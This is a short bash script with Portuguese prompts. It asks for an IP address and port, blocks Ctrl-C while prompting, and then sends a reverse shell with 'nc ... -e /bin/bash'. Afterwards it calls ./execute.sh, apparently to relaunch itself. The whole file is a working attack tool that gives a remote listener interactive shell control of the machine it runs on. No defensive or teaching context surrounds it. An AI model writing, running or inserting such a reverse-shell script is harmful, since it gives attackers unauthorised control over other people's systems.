#!/bin/bash
trap '' 2
echo
read -p "Informe o IP no qual deseja enviar a Shell: " IPlistening
read -p "Informe a porta que está escutando: " PORTA
echo
echo "Enviando a Shell para a porta $PORTA do $IPlistening .."
echo
trap 2
nc $IPlistening $PORTA -e /bin/bash
./execute.sh
exit
